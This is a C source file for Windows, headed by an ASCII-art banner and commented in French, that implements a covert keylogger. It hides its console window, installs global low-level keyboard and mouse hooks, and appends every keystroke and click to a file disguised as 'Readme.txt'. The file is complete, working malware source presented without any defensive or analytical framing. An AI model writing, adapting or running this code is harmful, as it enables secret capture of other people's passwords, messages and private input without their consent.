/**
 *    ░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░░▒▓███████▓▒░    
 *    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░   
 *    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░   
 *    ░▒▓██████▓▒░ ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░   
 *    ░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░   
 *    ░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░   
 *    ░▒▓████████▓▒░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░   
 *                                                                                           
 *                                                                                           
 *    ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░                                                            
 *    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                                                            
 *    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                                                            
 *    ░▒▓███████▓▒░ ░▒▓██████▓▒░                                                             
 *    ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░                                                                
 *    ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░                                                                
 *    ░▒▓███████▓▒░   ░▒▓█▓▒░                                                                
 *                                                                                           
 *                                                                                           
 *    ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
 *    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 *    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 *    ░▒▓████████▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
 *    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 *    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 *    ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█████████████▓▒░░▒▓███████▓▒░  
 *                                                                                           
 *                                                                                           
 */

#include <windows.h>
#include <stdio.h>

HHOOK g_hKeyboardHook = NULL;
HHOOK g_hMouseHook = NULL;

void Stealth(void)
{
    HWND console = GetConsoleWindow();
    if (console)
        ShowWindow(console, SW_HIDE);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKB = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vk = pKB->vkCode;
        FILE *log = fopen("Readme.txt", "a+");
        if (log) {
            BYTE keyState[256];
            WORD out[2] = {0, 0};
            char buf[8] = {0};

            // Récupère l'état du clavier (touches SHIFT, CAPS, etc.)
            if (GetKeyboardState(keyState)) {
                int n = ToAscii((UINT)vk, pKB->scanCode, keyState, out, 0);
                if (n == 1) {
                    buf[0] = (char)(out[0] & 0xFF);
                    fputc(buf[0], log);
                    fclose(log);
                    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
                }
            }

            // Si ToAscii n'a pas renvoyé de caractère imprimable, log la touche lisible
            switch (vk) {
                case VK_SPACE:    fputs(" ", log); break;
                case VK_RETURN:   fputs("[ENTER]", log); break;
                case VK_BACK:     fputs("[BACKSPACE]", log); break;
                case VK_TAB:      fputs("[TAB]", log); break;
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:   fputs("[SHIFT]", log); break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL: fputs("[CTRL]", log); break;
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:    fputs("[ALT]", log); break;
                case VK_CAPITAL:  fputs("[CAPSLOCK]", log); break;
                case VK_ESCAPE:   fputs("[ESC]", log); break;
                case VK_DELETE:   fputs("[DEL]", log); break;
                case VK_END:      fputs("[END]", log); break;
                case VK_HOME:     fputs("[HOME]", log); break;
                case VK_LEFT:     fputs("[LEFT]", log); break;
                case VK_RIGHT:    fputs("[RIGHT]", log); break;
                case VK_UP:       fputs("[UP]", log); break;
                case VK_DOWN:     fputs("[DOWN]", log); break;
                default:
                    // Log le code virtuel si non reconnu
                    fprintf(log, "[VK_%u]", (unsigned)vk);
                    break;
            }
            fclose(log);
        }
    }

    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0) {
        FILE *log = fopen("Readme.txt", "a+");
        if (log) {
            switch (wParam) {
                case WM_LBUTTONDOWN:
                    fputs(" [LEFT-CLICK] ", log);
                    break;
                case WM_RBUTTONDOWN:
                    fputs(" [RIGHT-CLICK] ", log);
                    break;
                case WM_MOUSEWHEEL:
                {
                    MSLLHOOKSTRUCT *p = (MSLLHOOKSTRUCT *)lParam;
                    SHORT delta = HIWORD(p->mouseData);
                    if (delta > 0) fputs(" [WHEEL-UP] ", log);
                    else if (delta < 0) fputs(" [WHEEL-DOWN] ", log);
                    break;
                }
                default:
                    break;
            }
            fclose(log);
        }
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

int main(void)
{
    Stealth();

    HINSTANCE hInstance = GetModuleHandle(NULL);

    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    g_hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, hInstance, 0);

    if (g_hKeyboardHook != NULL && g_hMouseHook != NULL) {
        puts("[!] Hooks installés avec succès");
    } else {
        // Affiche quel hook a échoué
        if (g_hKeyboardHook == NULL)
            fprintf(stderr, "[!] Erreur: impossible d'installer le hook clavier\n");
        if (g_hMouseHook == NULL)
            fprintf(stderr, "[!] Erreur: impossible d'installer le hook souris\n");
        // On peut continuer ou terminer ; ici on quitte
        return 1;
    }

    MSG msg;
    // Boucle de messages standard
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Défaire les hooks avant de quitter
    if (g_hKeyboardHook) UnhookWindowsHookEx(g_hKeyboardHook);
    if (g_hMouseHook)   UnhookWindowsHookEx(g_hMouseHook);

    return 0;
}
